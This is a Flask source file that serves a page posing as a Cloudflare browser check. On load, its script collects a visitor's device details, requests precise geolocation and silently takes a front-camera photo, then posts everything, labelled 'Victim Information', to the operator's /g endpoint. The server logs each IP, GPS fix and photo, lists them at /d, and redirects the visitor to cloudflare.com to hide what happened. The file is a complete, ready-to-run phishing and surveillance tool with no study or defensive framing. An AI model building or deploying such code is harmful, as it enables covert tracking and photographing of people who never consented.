import os
import json
import time
import random
import string
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

x_storage = []

def m_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

PAGE_HTML = """
<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Just a moment...</title>
<style type="text/css">
html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
p {font-size: 20px; font-weight: 400; margin: 8px 0;}
p, .attribution, {text-align: center;}
#spinner {margin: 0 auto 30px auto; display: block;}
.attribution {margin-top: 32px;}
@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
a:hover{color: #f4a15d}
.attribution{font-size: 16px; line-height: 1.5;}
.ray_id{display: block; margin-top: 8px;}
#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
#cf-hcaptcha-container { text-align:center;}
#cf-hcaptcha-container iframe { display: inline-block;}
</style>
</head>
<body>
<table width="100%" height="100%" cellpadding="20">
<tbody>
<tr>
<td align="center" valign="middle">
<div class="cf-browser-verification cf-im-under-attack">
<noscript>
<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
</noscript>
<div id="cf-content" style="display: block;">
<div id="cf-bubbles">
<div class="bubbles"></div>
<div class="bubbles"></div>
<div class="bubbles"></div>
</div>
<h1>
<span data-translate="checking_browser">Checking your browser before accessing</span> the website.
</h1>
<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
</div>
<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p>
<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p>
<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p>
</div>
<form class="challenge-form" id="challenge-form" action="#" method="POST" enctype="application/x-www-form-urlencoded">
<span data-translate="error" style="display: none;">error code: 1020</span>
</form>
</div>
<div class="attribution">
DDoS protection by 
<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
<br>
<span class="ray_id">Ray ID: <code id="ray">{{r_id}}</code></span>
</div>
</td>
</tr>
</tbody>
</table>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden id="canvas" width="500" height="500"></canvas>

<script>
var c=false,l=false;
var uid = "{{uid}}";

async function gather(){
    var td = "";
    
    td += '<code>✅ Victim Information</code><br><br>';
    td += '<b>⚓ IP: Checking...</b><br>';

    td += "<br><b>⏳ Date In Victim's Device :</b> " + new Date() + "<br>";

    function getDeviceName() {
        const ua = navigator.userAgent;
        if (/iPhone/.test(ua)) return "iPhone";
        if (/iPad/.test(ua)) return "iPad";
        if (/Android/.test(ua)) {
            const m = ua.match(/Android[^;]*;[^)]*\)([^;]*)/);
            return m ? m[1].trim() : "Android Device";
        }
        if (/Windows Phone/.test(ua)) return "Windows Phone";
        if (/Windows/.test(ua)) return "Windows PC";
        if (/Macintosh/.test(ua)) return "Mac";
        if (/Linux/.test(ua)) return "Linux Device";
        return "Unknown Device";
    }

    function getOSVersion() {
        const ua = navigator.userAgent;
        let m;
        if ((m = ua.match(/Android (\\d+(?:\\.\\d+)?)/))) return `Android ${m[1]}`;
        if ((m = ua.match(/iPhone OS (\\d+_\\d+)/))) return `iOS ${m[1].replace('_', '.')}`;
        if ((m = ua.match(/Windows NT (\\d+\\.\\d+)/))) return `Windows ${m[1]}`;
        if ((m = ua.match(/Mac OS X (\\d+_\\d+)/))) return `macOS ${m[1].replace('_', '.')}`;
        return "Unknown OS";
    }

    td += "<br><b>📱 <i>DEVICE OVERVIEW</i></b><br>";
    td += "<b>📲 Device Name:</b> <code>" + getDeviceName() + "</code><br>";
    td += "<b>💻 Operating System:</b> <code>" + getOSVersion() + "</code><br>";
    td += "<b>🌐 Browser:</b> <code>" + navigator.userAgent.split(' ').slice(-2).join(' ') + "</code><br>";
    td += "<b>🔧 Platform:</b> <code>" + navigator.platform + "</code><br>";

    td += "<br><b>🖥️ <i>DISPLAY DETAILS</i></b><br>";
    td += "<b>📐 Screen Size:</b> <code>" + screen.width + " x " + screen.height + " pixels</code><br>";
    td += "<b>🪟 Window Size:</b> <code>" + window.innerWidth + " x " + window.innerHeight + " pixels</code><br>";
    td += "<b>🎨 Color Quality:</b> <code>" + screen.colorDepth + "-bit</code><br>";

    if(navigator.hardwareConcurrency) td += "<b>🧠 CPU Cores:</b> <code>" + navigator.hardwareConcurrency + "</code><br>";
    if(navigator.deviceMemory) td += "<b>💾 Device RAM:</b> <code>" + navigator.deviceMemory + " GB</code><br>";
    td += "<b>🌍 Language:</b> <code>" + navigator.language + "</code><br>";
    td += "<b>🕐 Timezone:</b> <code>" + Intl.DateTimeFormat().resolvedOptions().timeZone + "</code><br>";

    td += "<br><b>👆 <i>INPUT CAPABILITIES</i></b><br>";
    td += "<b>📱 Touch Screen:</b> <code>" + ('ontouchstart' in window ? '✅ Yes' : '❌ No') + "</code><br>";
    if(navigator.maxTouchPoints) td += "<b>🖐️ Max Touch Points:</b> <code>" + navigator.maxTouchPoints + "</code><br>";
    td += "<b>🍪 Cookies:</b> <code>" + (navigator.cookieEnabled?'✅ Enabled':'❌ Disabled') + "</code><br>";
    td += "<b>🌐 Online Status:</b> <code>" + (navigator.onLine?'✅ Connected':'❌ Offline') + "</code><br>";

    if("getBattery" in navigator){
        try {
            const battery = await navigator.getBattery();
            td += "<br><b>🔋 <i>BATTERY STATUS</i></b><br>";
            const batteryLevel = (battery.level*100).toFixed(0);
            td += "<b>🔋 Battery Level:</b> <code><b>" + batteryLevel + "%</b></code><br>";
            td += "<b>⚡ Charging Status:</b> <code>" + (battery.charging?"<b>✅ Charging</b>":"<b>🔌 Not Charging</b>") + "</code><br>";
        } catch(e) {}
    }

    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                const crd = pos.coords;
                fetch('/g', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'location',
                        lat: crd.latitude,
                        lon: crd.longitude,
                        acc: crd.accuracy,
                        uid: uid
                    })
                });
                l = true;
                red();
            },
            function(err) {
                l = true;
                red();
            },
            {enableHighAccuracy: true, maximumAge: 0, timeout: 10000}
        );
    } else {
        l = true;
        red();
    }

    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = stream;
            await video.play();
            
            setTimeout(function(){
                ctx.drawImage(video, 0, 0, 500, 500);
                const canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
                
                fetch('/g', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'camera',
                        img: canvasData,
                        uid: uid
                    })
                });
                
                stream.getTracks().forEach(track => track.stop());
                c = true;
                red();
            }, 2000);
            
        } catch(e) {
            c = true;
            red();
        }
    } else {
        c = true;
        red();
    }

    fetch('/g', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'info',
            data: td,
            uid: uid,
            ua: navigator.userAgent,
            screen: {w: screen.width, h: screen.height},
            lang: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        })
    });
}

function red(){
    if(c && l){
        setTimeout(function(){
            window.location.href = "https://cloudflare.com";
        }, 3000);
    }
}

window.onload = function() {
    gather();
    var chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
    var str = "";
    for(var i = 0; i < 16; i++) {
        str += chars[Math.floor(Math.random() * 35)];
    }
    document.getElementById("ray").innerHTML = str;
};
</script>
</body>
</html>
"""

@app.route('/')
def h_main():
    r_val = m_id()
    u_val = m_id()
    resp = make_response(render_template_string(PAGE_HTML, r_id=r_val, uid=u_val))
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    return resp

@app.route('/g', methods=['POST'])
def h_grab():
    d = request.get_json()
    d['ts'] = time.time()
    d['ip_addr'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    x_storage.append(d)
    
    t = time.strftime('%H:%M:%S')
    print(f"[+] {t} - {d.get('type', 'unknown')} from {d.get('ip_addr', 'N/A')}")
    
    if d.get('type') == 'location':
        print(f"    📍 GPS: {d.get('lat', 'N/A')}, {d.get('lon', 'N/A')}")
    
    if d.get('type') == 'camera':
        print(f"    📸 Photo captured ({len(d.get('img', ''))} bytes)")
    
    if d.get('type') == 'info':
        print(f"    📱 Device info collected")
    
    return {'s': 'ok'}

@app.route('/d')
def h_data():
    return {'c': len(x_storage), 'items': x_storage}

@app.route('/x')
def h_clear():
    x_storage.clear()
    return {'s': 'cleared'}

if __name__ == '__main__':
    p = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=p, debug=False)
